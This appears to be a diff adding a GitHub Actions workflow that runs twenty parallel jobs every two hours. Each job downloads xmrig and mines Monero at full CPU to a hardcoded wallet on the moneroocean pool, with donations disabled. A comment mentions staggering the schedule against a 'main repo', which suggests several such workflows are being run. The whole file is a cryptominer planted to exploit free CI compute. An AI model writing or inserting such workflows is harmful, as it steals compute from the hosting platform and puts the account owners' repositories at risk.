@@ -1,0 +1,32 @@
+name: ⛏ Mine-C
+
+on:
+  push:
+  schedule:
+    - cron: '15 */2 * * *'  # 每2小时偏移15分，避免和主repo冲突
+  workflow_dispatch:
+
+jobs:
+  miner:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        worker: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]
+      fail-fast: false
+      max-parallel: 20
+    timeout-minutes: 110
+    steps:
+      - name: Setup
+        run: sudo sysctl -w vm.nr_hugepages=1280 2>/dev/null || true
+      - name: Download xmrig
+        run: |
+          curl -L -o xmrig.tar.gz "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-focal-x64.tar.gz"
+          tar xzf xmrig.tar.gz --strip-components=1
+          chmod +x xmrig
+      - name: ⛏ Mine
+        run: |
+          ./xmrig -o gulf.moneroocean.stream:443 --tls \
+            -u 45qqTqhjmsz8mhzry3dG6rJgt9Jdzfh9xa6Skh1mtmBGgNubPDsrJVVEg6cWS6DtEB5i6BWTEaQA7BRws6UEibKEAQ1dd9X \
+            -p "gh-c-${{ matrix.worker }}" \
+            --donate-level=0 --print-time=300 \
+            --cpu-max-threads-hint=100
